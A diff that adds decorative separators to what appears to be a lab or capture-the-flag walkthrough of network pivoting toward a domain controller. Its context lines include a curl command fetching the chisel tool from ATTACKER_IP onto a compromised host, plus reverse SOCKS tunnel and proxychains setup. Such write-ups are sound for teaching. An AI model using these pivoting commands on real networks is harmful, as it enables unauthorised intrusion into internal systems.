@@ -1170,6 +1170,12 @@ default via 172.16.20.1 dev eth0
 ```
 
 The grommunio host is `172.16.20.10`; the default gateway `172.16.20.1` is the domain controller `DC01`. This subnet is not routable from the attacker directly, so a tunnel is required. (A second workstation, `WS02`, also lives on this subnet and matters later.)
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
 
 #### 5.6.2 Build a reverse SOCKS tunnel with chisel
 
@@ -1185,6 +1191,12 @@ curl http://ATTACKER_IP:8000/chisel -o /tmp/chisel && chmod +x /tmp/chisel
 ```
 
 The client reports `Connected`, and the server shows `session#1: ... R:127.0.0.1:1080 => socks: Listening`. A SOCKS5 proxy is now live on the attacker at `127.0.0.1:1080`, routing into `172.16.20.0/24`.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
 
 #### 5.6.3 Point proxychains at the tunnel (and a config gotcha)
 
@@ -1196,6 +1208,12 @@ tail -n 3 /etc/proxychains4.conf
 ```
 
 Gotcha: proxychains ships in `strict_chain` mode with a default `socks4 127.0.0.1 9050` (Tor) entry. If that line is left active, every request is chained through the dead 9050 proxy first and times out (`127.0.0.1:9050 ... timeout`). Comment it so only the chisel `socks5 127.0.0.1 1080` entry remains.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
 
 #### 5.6.4 Sanity check through the tunnel
 
